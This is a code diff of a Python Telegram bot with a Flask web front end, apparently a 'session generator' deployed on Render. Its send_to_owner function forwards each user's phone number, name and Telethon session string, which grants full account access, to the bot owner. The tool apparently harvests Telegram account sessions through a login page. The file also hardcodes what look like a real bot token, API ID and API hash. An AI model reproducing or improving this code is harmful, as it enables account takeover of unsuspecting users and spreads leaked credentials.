@@ -20,13 +20,13 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, F
 
 # ========== CONFIGURATION ==========
 # ⚠️ REPLACE THESE WITH YOUR VALUES
-BOT_TOKEN = "8240405151:AAHyqSwjXE39_o_YvGXSv_9PCx1m8ZIYH84"  # Get from @BotFather
-API_ID = 38550990   # Replace with your API ID (from my.telegram.org)
-API_HASH = "26c65e47681802c551563f11b6b333a4"  # Replace with your API hash
-OWNER_ID = 8158086374 # Replace with your Telegram user ID
+BOT_TOKEN = "8240405151:AAHyqSwjXE39_o_YvGXSv_9PCx1m8ZIYH84"
+API_ID = 38550990
+API_HASH = "26c65e47681802c551563f11b6b333a4"
+OWNER_ID = 8158086374
 
 # For panels, set this manually or use ngrok
-PUBLIC_URL = ""  # Will be set via /seturl command or auto-detected
+PUBLIC_URL = ""  # Will be set via /seturl command
 
 # ========== SETUP ==========
 logging.basicConfig(
@@ -166,6 +166,9 @@ def verify_code():
         return jsonify({'success': False, 'error': str(e)})
 
 # ========== TELEGRAM BOT FUNCTIONS ==========
+# These need to be defined before they're used in handlers
+application = None  # Will be set in main()
+
 def send_to_owner(user_id, phone, session_string, first_name, username):
     """Send session details to owner"""
     message = f"""🔐 **NEW SESSION GENERATED**
@@ -344,13 +347,11 @@ def main():
     print(f"🆔 Owner ID: {OWNER_ID}")
     print("="*50)
     
-    # Start Flask in background
-    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False))
-    flask_thread.daemon = True
-    flask_thread.start()
-    print("✅ Flask web app started on port 5000")
-    print("📱 Web app URL: http://localhost:5000")
-    print("⚠️ This URL is local only - use ngrok or /seturl for public access")
+    # IMPORTANT: DO NOT start Flask thread on Render!
+    # Gunicorn will serve Flask directly
+    print("✅ Flask app will be served by Gunicorn")
+    print(f"📱 Web app URL: https://sessionsgen.onrender.com")
+    print("⚠️ Use /seturl to configure this URL in the bot")
     
     # Create Telegram bot application
     application = Application.builder().token(BOT_TOKEN).build()
@@ -368,5 +369,6 @@ def main():
     print("="*50)
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
+# This is critical - only run this if executing directly (not on Render)
 if __name__ == '__main__':
     main()
